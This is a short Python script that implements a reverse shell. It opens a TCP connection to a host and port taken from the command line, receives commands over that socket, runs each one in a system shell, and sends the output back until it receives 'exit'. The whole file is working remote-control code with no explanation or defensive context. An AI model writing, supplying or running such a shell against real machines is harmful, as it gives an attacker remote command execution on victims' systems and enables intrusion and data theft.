import socket 
import sys
import subprocess as sp

host=str(sys.argv[1])
port=int(sys.argv[2])
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((host,port))

while 1:
    command = conn.recv(1024).decode( 'utf-8' )
    if command !="exit":
        sh = sp.Popen(command, shell=True,
                     stdout=sp.PIPE,
                     stderr=sp.PIPE,
                     stdin=sp.PIPE)
        out = sh.communicate()[0]
        result = str(out)
        conn.send(result.encode('utf-8'))
    else:
        break
        
conn.close()
